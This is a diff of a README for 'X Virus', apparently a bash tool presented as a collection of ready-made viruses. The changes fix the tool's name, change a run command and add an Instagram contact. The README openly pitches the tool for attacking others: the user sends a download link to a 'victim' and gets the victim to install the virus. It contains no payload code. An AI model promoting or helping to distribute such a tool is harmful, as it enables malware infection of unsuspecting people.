@@ -29,7 +29,7 @@ Because of consecutive storm here in our country. The update will on February
 ## What does `X Virus` Actually do?
 Well __x Virus__ is a Collection of ready made Viruses.
 In other Virus Generator tools like let's say vbug, or vcrt. It generate apk virus and you have to manually send it to your victim.
-However in __Z Virus__ All you have to do is to send the __link__ to your victim and make the victim download the virus. 
+However in __x Virus__ All you have to do is to send the __link__ to your victim and make the victim download the virus. 
 
 
 ## Install this first:
@@ -54,8 +54,16 @@ __Other__
 
 
 ## To Run:
-> ./xvirus
+> ./Xvirus
 
 __Or__
 
 > bash Xvirus
+
+
+
+CONTACT ME!!
+INSTAGRAM: malik_atiquz_.zaman
+
+
+
